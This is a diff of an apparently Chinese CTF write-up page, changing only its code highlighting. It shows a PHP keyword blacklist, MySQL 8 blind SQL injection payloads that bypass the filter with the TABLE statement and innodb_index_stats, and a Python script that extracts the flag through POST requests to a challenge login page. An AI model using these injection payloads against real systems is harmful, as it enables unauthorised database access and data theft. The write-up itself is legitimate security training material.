-    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;try again!&#x27;</span>);
-    <span class="hljs-keyword">exit</span>();
-&#125;</code></pre></div>
+<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/select|;|creat|like|insert| |sys|drop|union|file|show|rename|handler|alter|sys|if|prepare|execute|tables|delete|where\./i"</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'try again!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
 
 <p>注库名：</p>
-<div class="hljs"><pre><code class="hljs sql">(ascii(substr(database(),&#123;i&#125;,1)))=&#123;val&#125;</code></pre></div>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>&#123;i&#125;<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>&#123;val&#125;</code></pre>
 
 <p>tables被过，不能用<code>information_schema.tables</code>;</p>
 <p>mysql8中有<code>mysql.innodb_table_stats</code>和<code>mysql.innodb_index_stats</code>;以此获取表名</p>
-<div class="hljs"><pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre></div>
+<pre class="language-sql" data-language="sql"><code class="language-sql">admin' <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"ctf"</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">table</span> mysql<span class="token punctuation">.</span>innodb_index_stats <span class="token keyword">order</span> <span class="token keyword">by</span> last_update <span class="token keyword">desc</span> <span class="token keyword">limit</span> <span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span></code></pre>
 
 <p>select 被过，用MySQL8的table语句</p>
-<div class="hljs"><pre><code class="hljs sql">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code></pre></div>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">TABLE</span> table_name <span class="token punctuation">[</span><span class="token keyword">ORDER</span> <span class="token keyword">BY</span> column_name<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token keyword">LIMIT</span> number <span class="token punctuation">[</span><span class="token keyword">OFFSET</span> number<span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre>
 
 <p>可以把<code>table t</code>简单理解成<code>select * from t</code>，和<code>select</code>的区别在于</p>
 <ul>
 <li><code>table</code>总是显示表的所有列</li>
 <li><code>table</code>不允许任何的行过滤;也就是说，<code>TABLE</code>不支持任何<code>WHERE</code>子句。<br> 可以用来盲注表名</li>
 </ul>
-<div class="hljs"><pre><code class="hljs sql">admin&#x27; and ((&quot;ctf&quot;,&quot;%s&quot;,1,1,1,1,1,1)&lt;(table mysql.innodb_index_stats order by last_update desc limit 5,1))#</code></pre></div>
+<pre class="language-sql" data-language="sql"><code class="language-sql">admin' <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"ctf"</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">table</span> mysql<span class="token punctuation">.</span>innodb_index_stats <span class="token keyword">order</span> <span class="token keyword">by</span> last_update <span class="token keyword">desc</span> <span class="token keyword">limit</span> <span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#</span></code></pre>
 
 <p>注数据</p>
-<div class="hljs"><pre><code class="hljs sql">(ascii(substr(hex((table fl11aag limit 1,1)),&#123;i&#125;,1)))=&#123;val&#125;</code></pre></div>
+<pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>hex<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">table</span> fl11aag <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>&#123;i&#125;<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span>&#123;val&#125;</code></pre>
 
-<div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
-<span class="hljs-keyword">import</span> string
-<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> string
+<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
 
-<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strtohex</span>(<span class="hljs-params">s</span>):</span>
-    ss = <span class="hljs-string">&quot;0x&quot;</span>
-    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:
-        ss +=  <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))).replace(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&#x27;&#x27;</span>)
-    <span class="hljs-keyword">return</span> ss
-url=<span class="hljs-string">&quot;http://182.116.62.85:26571/login.php&quot;</span>
+<span class="token keyword">def</span> <span class="token function">strtohex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    ss <span class="token operator">=</span> <span class="token string">"0x"</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
+        ss <span class="token operator">+=</span>  <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> ss
+url<span class="token operator">=</span><span class="token string">"http://182.116.62.85:26571/login.php"</span>
 
-flag=<span class="hljs-string">&quot;flag&#123;&quot;</span>
-<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):
-    <span class="hljs-comment">#for j in &quot;.-0123456789abcdefghijklmnopqrstuvwxyz0123456789&#123;|&#125;~&quot;:</span>
-    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">19</span>,<span class="hljs-number">128</span>):
-        <span class="hljs-comment">#payload=&quot;-1&#x27;||((&#x27;def&#x27;,&#x27;ctf&#x27;,&#x27;fl11aag&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#x27;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table/**/information_schema.columns/**/limit/**/3,1))#&quot;.format(flag+j)</span>
-        payload=<span class="hljs-string">&quot;-1&#x27;||((binary/**/&#123;&#125;)&lt;(table/**/ctf.fl11aag/**/limit/**/1,1))#&quot;</span>.<span class="hljs-built_in">format</span>(strtohex(flag+<span class="hljs-built_in">chr</span>(j)))
-        data=&#123;
-            <span class="hljs-string">&quot;username&quot;</span>:payload,
-            <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>
-        &#125;
+flag<span class="token operator">=</span><span class="token string">"flag&#123;"</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment">#for j in ".-0123456789abcdefghijklmnopqrstuvwxyz0123456789&#123;|&#125;~":</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment">#payload="-1'||(('def','ctf','fl11aag','&#123;&#125;','',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table/**/information_schema.columns/**/limit/**/3,1))#".format(flag+j)</span>
+        payload<span class="token operator">=</span><span class="token string">"-1'||((binary/**/&#123;&#125;)&lt;(table/**/ctf.fl11aag/**/limit/**/1,1))#"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>strtohex<span class="token punctuation">(</span>flag<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
+            <span class="token string">"username"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>
+            <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"1"</span>
+        <span class="token punctuation">&#125;</span>
 
-        r=requests.post(url=url,data=data)
-        <span class="hljs-comment">#print(r.text)</span>
-        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">in</span> r.text <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;try&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:
-            <span class="hljs-comment">#print(r.text)</span>
-            <span class="hljs-comment">#print(payload)</span>
-            <span class="hljs-comment">#print(j)</span>
-            flag+=<span class="hljs-built_in">chr</span>(j<span class="hljs-number">-1</span>)
-            print(flag)
-            <span class="hljs-keyword">break</span></code></pre></div>
+        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+        <span class="token comment">#print(r.text)</span>
+        <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text <span class="token keyword">and</span> <span class="token string">"try"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+            <span class="token comment">#print(r.text)</span>
+            <span class="token comment">#print(payload)</span>
+            <span class="token comment">#print(j)</span>
+            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
+            <span class="token keyword">break</span></code></pre>
 
 <h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p><a target="_blank" rel="noopener" href="http://blog.cyberpeace.cn/Spring-Web-Flow/">http://blog.cyberpeace.cn/Spring-Web-Flow/</a></p>
 
@@ -596,6 +604,8 @@ flag=<span class="hljs-string">&quot;flag&#123;&quot;</span>
 
 
 
+  
+    
   
 
 
